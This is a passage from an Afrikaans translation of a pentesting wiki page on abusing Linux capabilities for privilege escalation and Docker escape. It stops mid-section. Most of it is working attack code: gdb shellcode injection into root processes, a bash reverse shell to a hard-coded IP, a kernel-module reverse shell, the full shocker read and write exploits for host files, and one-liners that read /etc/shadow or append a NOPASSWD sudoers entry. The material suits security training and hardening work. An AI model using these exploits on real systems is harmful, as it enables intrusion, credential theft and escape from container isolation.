Dit sal jou in staat stel om die root-proses te foutopspoor met gdb.
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Voorbeeld met omgewing (Docker-ontsnapping) - Nog 'n gdb-misbruik**

As **GDB** geïnstalleer is (of jy kan dit installeer met `apk add gdb` of `apt install gdb` byvoorbeeld), kan jy **'n proses vanaf die gasheer af ontleed** en dit die `system`-funksie laat aanroep. (Hierdie tegniek vereis ook die vermoë `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Jy sal nie die uitset van die uitgevoerde bevel kan sien nie, maar dit sal deur daardie proses uitgevoer word (so kry 'n omgekeerde dop).

{% hint style="warning" %}
As jy die fout "No symbol "system" in current context." kry, kyk na die vorige voorbeeld waar 'n skulpkode in 'n program gelaai word via gdb.
{% endhint %}

**Voorbeeld met omgewing (Docker-ontsnapping) - Skulpkode-inspuiting**

Jy kan die geaktiveerde vermoëns binne die docker-houer nagaan deur die volgende te gebruik:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lys **prosesse** wat op die **gasheer** loop `ps -eaf`

1. Kry die **argitektuur** `uname -m`
2. Vind 'n **shellcode** vir die argitektuur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Vind 'n **program** om die **shellcode** in 'n proses se geheue in te spuit ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Wysig** die **shellcode** binne die program en **kompileer** dit `gcc inject.c -o inject`
5. **Spuit** dit in en gryp jou **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** gee 'n proses die mag om kernel modules te **laai en te verwyder (`init_module(2)`, `finit_module(2)` en `delete_module(2)` stelseloproepe)**, wat direkte toegang tot die kern van die kernel bied. Hierdie vermoë bied kritieke sekuriteitsrisiko's, aangesien dit bevoorregte eskalasie en totale stelselkompromieë moontlik maak deur wysigings aan die kernel toe te laat, en sodoende alle Linux-sekuriteitsmeganismes, insluitend Linux-sekuriteitsmodules en houer-isolasie, te omseil.
**Dit beteken dat jy kernel modules in die kernel van die gasheer masjien kan invoeg/verwyder.**

**Voorbeeld met binêre**

In die volgende voorbeeld het die binêre **`python`** hierdie vermoë.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Standaard, **`modprobe`** opdrag kontroleer vir afhanklikheidlys en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
Om hiervan misbruik te maak, skep ons 'n vals **lib/modules**-gids:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Dan **kompileer die kernel module wat jy hieronder kan vind en kopieer** dit na hierdie folder:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Uiteindelik, voer die nodige Python-kode uit om hierdie kernel-module te laai:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Voorbeeld 2 met binêre**

In die volgende voorbeeld het die binêre **`kmod`** hierdie vermoë.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Dit beteken dat dit moontlik is om die opdrag **`insmod`** te gebruik om 'n kernel-module in te voeg. Volg die voorbeeld hieronder om 'n **omgekeerde skulp** te kry deur van hierdie voorreg misbruik te maak.

**Voorbeeld met omgewing (Docker-ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die Docker-houer nagaan deur die volgende te gebruik:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die **SYS\_MODULE** vermoë geaktiveer is.

**Skep** die **kernel module** wat 'n omgekeerde skulp sal uitvoer en die **Makefile** om dit te **kompileer**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Die leë karakter voor elke woord in die Makefile **moet 'n tab wees, nie spasies nie**!
{% endhint %}

Voer `make` uit om dit te kompileer.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Uiteindelik, begin `nc` binne 'n skulp en **laai die module** vanuit 'n ander skulp en jy sal die skulp in die nc-proses vasvang:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Misbruik van SYS\_MODULE-vermoë" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

'n Ander voorbeeld van hierdie tegniek kan gevind word by [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel 'n proses in staat om **om versperrings vir lees van lêers en lees en uitvoer van gide te omseil**. Dit word hoofsaaklik gebruik vir lêersoek- of leesdoeleindes. Dit stel egter ook 'n proses in staat om die `open_by_handle_at(2)`-funksie te gebruik, wat enige lêer kan benader, insluitend dié buite die proses se bergingsnaamruimte. Die handvatsel wat in `open_by_handle_at(2)` gebruik word, behoort 'n nie-deursigtige identifiseerder te wees wat verkry word deur `name_to_handle_at(2)`, maar dit kan sensitiewe inligting soos inode-nommers insluit wat vatbaar is vir manipulasie. Die potensiaal vir uitbuiting van hierdie vermoë, veral in die konteks van Docker-houers, is gedemonstreer deur Sebastian Krahmer met die shocker-uitbuiting, soos geanaliseer [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Dit beteken dat jy versperrings vir lêerleestoestemming en gidslees-/uitvoertoestemming kan omseil.**

**Voorbeeld met binêre**

Die binêre sal enige lêer kan lees. So, as 'n lêer soos tar hierdie vermoë het, sal dit die shadow-lêer kan lees:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Voorbeeld met binary2**

In hierdie geval stel ons voor dat die **`python`** binêre lêer hierdie vermoë het. Om roetebestande te lys, kan jy die volgende doen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
En om 'n lêer te lees, kan jy die volgende doen:
```python
print(open("/etc/shadow", "r").read())
```
**Voorbeeld in omgewing (Docker-ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die Docker-houer nagaan deur die volgende te gebruik:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die **DAC\_READ\_SEARCH** vermoë geaktiveer is. As gevolg hiervan kan die houer **prosesse ontleed**.

Jy kan leer hoe die volgende uitbuiting werk by [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar in opsomming **CAP\_DAC\_READ\_SEARCH** laat ons nie net toe om deur die lêersisteem te beweeg sonder toestemmingskontroles nie, maar verwyder ook uitdruklik enige kontroles vir _**open\_by\_handle\_at(2)**_ en **kan ons proses toelaat om sensitiewe lêers wat deur ander prosesse geopen is, te benader**.

Die oorspronklike uitbuiting wat hierdie vermoëns misbruik om lêers vanaf die gasheer te lees, kan hier gevind word: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), die volgende is 'n **aangepaste weergawe wat jou in staat stel om die lêer wat jy wil lees as die eerste argument aan te dui en dit in 'n lêer te stort**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Die uitbuiting moet 'n verwysing na iets vind wat op die gasheer gemonteer is. Die oorspronklike uitbuiting het die lêer /.dockerinit gebruik en hierdie aangepaste weergawe gebruik /etc/hostname. As die uitbuiting nie werk nie, moet jy dalk 'n ander lêer instel. Om 'n lêer te vind wat op die gasheer gemonteer is, voer jy net die mount-opdrag uit:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Misbruik van die DAC\_READ\_SEARCH-vermoë" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheidgebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie- en kuberveiligheidprofessionals in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Dit beteken dat jy skryftoestemmingskontroles vir enige lêer kan omseil, sodat jy enige lêer kan skryf.**

Daar is baie lêers wat jy kan **oorweldig om voorregte te verhoog,** [**jy kan idees hier kry**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binêre**

In hierdie voorbeeld het vim hierdie vermoë, sodat jy enige lêer soos _passwd_, _sudoers_ of _shadow_ kan wysig:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Voorbeeld met binêre nommer 2**

In hierdie voorbeeld sal die **`python`** binêre nommer hierdie vermoë hê. Jy kan python gebruik om enige lêer te oorskryf:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Voorbeeld met omgewing + CAP_DAC_READ_SEARCH (Docker-ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die Docker-houer nagaan deur die volgende te gebruik:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Eerstens lees die vorige afdeling wat [**misbruik maak van die DAC\_READ\_SEARCH-vermoë om willekeurige lêers te lees**](linux-capabilities.md#cap\_dac\_read\_search) van die gasheer en **kompileer** die uitbuiting.\
Daarna, **kompileer die volgende weergawe van die shocker-uitbuiting** wat jou sal toelaat om **willekeurige lêers te skryf** binne die gasheer se lêersisteem:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Om die docker-container te ontsnap, kan jy die lêers `/etc/shadow` en `/etc/passwd` van die gasheer **aflaai**, 'n **nuwe gebruiker** daaraan **toevoeg**, en **`shocker_write`** gebruik om hulle te oorskryf. Daarna, **toegang** via **ssh**.

**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing DAC\_OVERRIDE Capability" van** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Dit beteken dat dit moontlik is om die eienaarskap van enige lêer te verander.**

**Voorbeeld met binêre**

Stel dat die **`python`** binêre hierdie vermoë het, kan jy die **eienaar** van die **shadow**-lêer **verander**, die root wagwoord **verander**, en voorregte verhoog:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Of met die **`ruby`** binêre lêer wat hierdie vermoë het:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Dit beteken dat dit moontlik is om die toestemming van enige lêer te verander.**

**Voorbeeld met binêre**

As python hierdie vermoë het, kan jy die toestemmings van die skadulêer wysig, **die root wagwoord verander**, en voorregte verhoog:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Dit beteken dat dit moontlik is om die effektiewe gebruikers-ID van die geskepde proses te stel.**

**Voorbeeld met binêre**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om voorregte na root te verhoog:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Nog 'n manier:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Dit beteken dat dit moontlik is om die effektiewe groep-id van die geskep proses te stel.**

Daar is baie lêers wat jy kan oorskryf om voorregte te verhoog, [**jy kan idees hier kry**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binêre**

In hierdie geval moet jy soek na interessante lêers wat 'n groep kan lees omdat jy enige groep kan voorstel:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sodra jy 'n lêer gevind het wat jy kan misbruik (deur te lees of te skryf) om voorregte te verhoog, kan jy **'n skulp impersonateer as die interessante groep** met:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In hierdie geval is die groep shadow geïmpersonaliseer sodat jy die lêer `/etc/shadow` kan lees:
```bash
cat /etc/shadow
```
As **docker** geïnstalleer is, kan jy die **docker-groep** **impersonate** en dit misbruik om te kommunikeer met die [**docker-socket** en voorregte te verhoog](./#writable-docker-socket).

## CAP\_SETFCAP

**Dit beteken dat dit moontlik is om voorregte op lêers en prosesse in te stel**

**Voorbeeld met binêre**

As python hierdie **voorreg** het, kan jy dit baie maklik misbruik om voorregte na root te verhoog:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Let daarop dat as jy 'n nuwe vermoë aan die binêre lêer toeken met CAP\_SETFCAP, sal jy hierdie vermoë verloor.
{% endhint %}

Sodra jy die [SETUID-vermoë](linux-capabilities.md#cap\_setuid) het, kan jy na sy afdeling gaan om te sien hoe om voorregte te verhoog.

**Voorbeeld met omgewing (Docker-ontsnapping)**

Standaard word die vermoë **CAP\_SETFCAP aan die proses binne die houer in Docker gegee**. Jy kan dit nagaan deur iets soos die volgende te doen:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Hierdie vermoë maak dit moontlik om **enige ander vermoë aan bineêre lêers te gee**, so ons kan dalk dink aan **ontsnapping** uit die houer deur misbruik te maak van enige van die ander vermoë-uitbrake wat op hierdie bladsy genoem word.\
Maar as jy byvoorbeeld die vermoëns CAP\_SYS\_ADMIN en CAP\_SYS\_PTRACE aan die gdb-binêre lêer probeer gee, sal jy vind dat jy hulle kan gee, maar die **binêre lêer sal nie in staat wees om uitgevoer te word nie**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Van die dokumentasie](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Toegelaat: Dit is 'n **beperkende superset vir die effektiewe vermoëns** wat die draad mag aanneem. Dit is ook 'n beperkende superset vir die vermoëns wat deur 'n draad by die erflike stel gevoeg kan word as dit nie die CAP\_SETPCAP-vermoë in sy effektiewe stel het nie._\
Dit lyk asof die Toegelate vermoëns diegene beperk wat gebruik kan word.\
Maar Docker verleen ook standaard die **CAP\_SETPCAP**, so jy kan dalk **nuwe vermoëns binne die erflike vermoëns stel**.\
Maar in die dokumentasie van hierdie vermoë: _CAP\_SETPCAP: \[…] **voeg enige vermoë van die oproepdraad se begrensingsstel by sy erflike stel**_.\
Dit lyk asof ons slegs vermoëns van die begrensingsstel by die erflike stel kan voeg. Dit beteken dat **ons nie nuwe vermoë soos CAP\_SYS\_ADMIN of CAP\_SYS\_PTRACE in die erflike stel kan plaas om voorregte te verhoog nie**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) bied 'n aantal sensitiewe verrigtinge, insluitend toegang tot `/dev/mem`, `/dev/kmem` of `/proc/kcore`, wysiging van `mmap_min_addr`, toegang tot `ioperm(2)` en `iopl(2)` stelseloproepe, en verskeie skyfopdragte. Die `FIBMAP ioctl(2)` is ook geaktiveer deur hierdie vermoë, wat in die [verlede](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) probleme veroorsaak het. Volgens die manblad maak dit ook die houer in staat om beskrywend `verskeie toestelspesifieke verrigtinge op ander toestelle uit te voer`.

Dit kan nuttig wees vir **voorregverhoging** en **Docker-ontsnapping**.

## CAP\_KILL

**Dit beteken dat dit moontlik is om enige proses te beëindig.**

**Voorbeeld met binêre**

Laat ons aanneem dat die **`python`** binêre hierdie vermoë het. As jy **ook 'n diens- of soketkonfigurasie** (of enige konfigurasie-lêer wat verband hou met 'n diens) kon wysig, kon jy dit agterdeur maak en dan die proses wat verband hou met daardie diens doodmaak en wag vir die nuwe konfigurasie-lêer om met jou agterdeur uitgevoer te word.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc met kill**

